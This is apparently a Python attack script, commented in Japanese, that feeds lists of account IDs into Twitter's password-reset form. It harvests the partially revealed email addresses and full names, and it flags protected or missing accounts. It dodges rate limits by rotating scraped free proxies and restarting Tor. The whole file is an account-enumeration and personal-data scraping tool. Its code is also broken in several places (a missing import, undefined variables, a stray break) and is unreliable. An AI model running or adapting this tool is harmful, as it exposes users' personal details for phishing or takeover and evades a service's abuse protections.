from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from mechanize import Browser
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import os
import requests
import base64



# -------------- 設定 -------------- #

# 最高スレッド数
max_thread = 3
# 接続タイムアウト設定
timeout = 5
# IDリストファイルパス
idlistPath    = "idlist.txt"
# パスワードリセットファイルパス
pwResetPath   = "pwReset.txt"
# 保護済みファイルパス
protectedPath = "protected.txt"
# プロキシリストファイルパス
proxylistPath = "proxylist.txt"

# ---------------------------------- #

keywords_list = ["Request help signing in to your account."]

protect_list = [
    "個人情報を確認してください",
    "Verify your personal information",
    "Gwirio eich gwybodaeth bersonol",
    "Verifiziere Deine persönlichen Informationen.",
]
error_list = [
    "We hebben je account niet gevonden met deze informatie.",
    "Wir konnten Deinen Account mit diesen Angaben nicht finden.",
    "Potrzebujemy tej informacji, aby znaleźć Twoje konto.",
    "Nous n'avons pas trouvé votre compte avec ces informations.",
    "入力された情報ではアカウントが見つかりませんでした。",
    "We couldn't find your account with that information.",
    "VNie znaleźliśmy Twojego konta z tą informacją.",
    "No pudimos encontrar tu cuenta con esa información.",
]
regulation_list = [
    "Réinitialisation du mot de passe",
    "Passwortrücksetzung",
    "Wachtwoordherstel",
    "Password Reset",
    "パスワードをリセット",
    "Restablecimiento de contraseña",
    "Lösenordsåterställning",
    "Resetowanie hasła",
    "Salasanan nollaus",
    "Сброс пароля",
]

pwReset       = []
protected     = []
proxies_list  = []
success_count = 0
connect_count = 0
page          = int(open(".proxy_website_data", "r").read())


def proxies_get():
    # ---------- ウィンドウを閉じた状態でChromeでウェブページを開きます ボット回避のため ---------- #
    options = Options()
    options.add_argument('--headless')
    driver = webdriver.Chrome(chrome_options=options)
    driver.get('http://free-proxy.cz/ja/proxylist/main/1')
    source = driver.page_source
    driver.quit()
    return source
    # ---------------------------------------------------------------------------------------- #

def thread(id, proxies, retry):
    global success_count, connect_count
    connect_count += 1
    print("connection:", proxies_list[0])
    try:
        br = Browser()
        br.set_proxies(proxies)
        br.set_handled_schemes(['http', 'https'])
        br.set_handle_robots(False)
        br.addheaders = [("User-agent", "Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)")]
        res = requests.get("http://inet-ip.info/ip", proxies=proxies, timeout=timeout)
        print("connected successfully:", res.text)
        success_count += 1

        # ------------------------------ スクレイピング ------------------------------ #
        br.open("https://twitter.com/account/begin_password_reset", timeout=10.0)
        br.select_form(action="/account/begin_password_reset")
        br["account_identifier"] = id
        br.submit()

        html = BeautifulSoup(br.response().read(), "html.parser")
        title = html.find("title").text
        body = html.find("body").text

        for error in error_list:
            if error in body:
                print("\n{},入力された情報ではアカウントが見つかりませんでした。".format(id))
                print("\n--------------------------------")
                break
            else:
                for keyword in keywords_list:
                    if keyword in title:
                        print("\n{},パスリセメソッド不在".format(id))
                        print("\n--------------------------------")
                        break

                else:
                    for protect in protect_list:
                        if protect in body:
                            print("\n{},保護済み".format(id))
                            print("\n--------------------------------")
                            break
                    else:
                        soupobject = BeautifulSoup(br.response().read(), "html.parser")
                        mailaddresses = soupobject.find_all("strong")
                        fullname = soupobject.find_all("b")

                        if mailaddresses == []:
                            print("\n" + id + ",規制\n")
                            subprocess.run("taskkill /IM tor.exe /F")
                            print("\n--------------------------------")
                            subprocess.Popen("tor")
                            res = requests.get(
                                "http://inet-ip.info/ip", proxies=proxies
                            )
                            print("\n" + res.text)
                            break

                        else:
                            willwritedata = id

                            for mailaddress in mailaddresses:
                                willwritedata += "," + mailaddress.text

                            for fullname in fullname:
                                fullname = fullname.text

                            print("\n" + fullname)
                            print(willwritedata + "\n")
                            パスリセ.append(fullname + "," + willwritedata + "\n")
                            print("--------------------------------")
                        break
                    break
                break
            break
        break
        # ----------------------------------------------------------------------------- #

    except:
        # --- プロキシ変更 --- #
        print("connection failed")
        proxies_list.remove(proxies_list[0])
        proxies = {
            "http": "http://"+proxies_list[0],
            "https": "https://"+proxies_list[0]
        }


def main(ids, retry):
    global page

    # スレッド設定
    th = ThreadPoolExecutor(max_workers=max_thread)


    for id in ids:

        # ---------------- プロキシ追加 ---------------- #
        if [] == proxies_list:
            page += 1
            html = BeautifulSoup(proxies_get(), "html.parser")
            tr = html.find_all("tr")
            for _tr in tr:
                address = ''
                port    = ''
                td = _tr.find_all("td")
                if 2 < len(td):
                    port    = td[1].find("span").get_text()
                    script  = td[0].find("script").string
                    _base64 = script.replace("document.write(Base64.decode(\"", "").replace("\"))", "")
                    address = base64.b64decode(_base64).decode()
                    proxies_list.append('{}:{}'.format(address, port))
        # ---------------------------------------------- #

        try:
            proxies = {
                    "http": "http://"+proxies_list[0],
                    "https": "https://"+proxies_list[0]
            }
        except: pass

        # ------------- スレッド実行 ------------ #
        __ = th.submit(thread, id, proxies, retry)
        __.result() # 例外キャッチ
        # -------------------------------------  #

        try: # プロキシ更新 --------------------- #
            proxies_list.remove(proxies_list[0])
        except: pass
        

    # スレッド終了
    th.shutdown()


# ------- 関数実行 ------- #
main(ids, 5)
# ----------------------- #

print("終了")

# ------- 巡回済みページを記録する ------- #
open(".proxy_website_data", "w").write(str(page))
# -------------------------------------- #

# ---------------- 接続成功率の計算 ---------------- #
prtcentage = int((success_count/connect_count)*100)
print("接続成功率：{}%".format(str(prtcentage)))
# ------------------------------------------------ #

input("エンターを押して終了")
